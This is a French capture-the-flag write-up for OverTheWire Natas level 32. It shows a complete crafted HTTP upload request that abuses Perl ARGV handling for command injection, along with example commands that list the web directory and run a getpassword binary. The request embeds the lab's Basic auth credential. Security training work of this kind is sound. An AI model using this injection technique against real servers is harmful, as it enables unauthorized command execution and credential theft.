En utilisant la requête HTTP suivante, il est possible d'envoyer la commande que l'on souhaite. Il suffit de remplacer \<command\> par ce que l'on souhaite exécuter 
```http
POST /index.pl?<command>%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 403
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
Upgrade-Insecure-Requests: 1
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQb9Tb7uqq6QBhPkN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas32.natas.labs.overthewire.org/index.pl
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryQb9Tb7uqq6QBhPkN
Content-Disposition: form-data; name="file";

ARGV
------WebKitFormBoundaryQb9Tb7uqq6QBhPkN
Content-Disposition: form-data; name="file"; filename="forged.csv"
Content-Type: text/csv

header1,header2
row1,row2

------WebKitFormBoundaryQb9Tb7uqq6QBhPkN
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryQb9Tb7uqq6QBhPkN--
```

Exemple: 
<code>command = ls%20/var/www/natas/natas32%20-la</code>
Il est important de noter que la commande quoi être url-encoded

Fichiers dans la directory /var/www/natas/natas32:
![[Fichiers de la directory.png]]

Fichier getpassword.c:
![[getpassword.c.png]]

Ensuite, il suffit d'exécuter le fichier avec 
<code>command = /var/www/natas/natas32/getpassword</code> 
et on a le mot de passe

Conclusion:
C'était la même chose que le niveau précédent. Il suffisait de le pousser un tout petit peu plus loin en exécutant un programme, mais il suffisait de continuer la [vidéo précédente](https://www.youtube.com/watch?v=BYl3-c2JSL8&t=1011s)pour savoir quoi faire
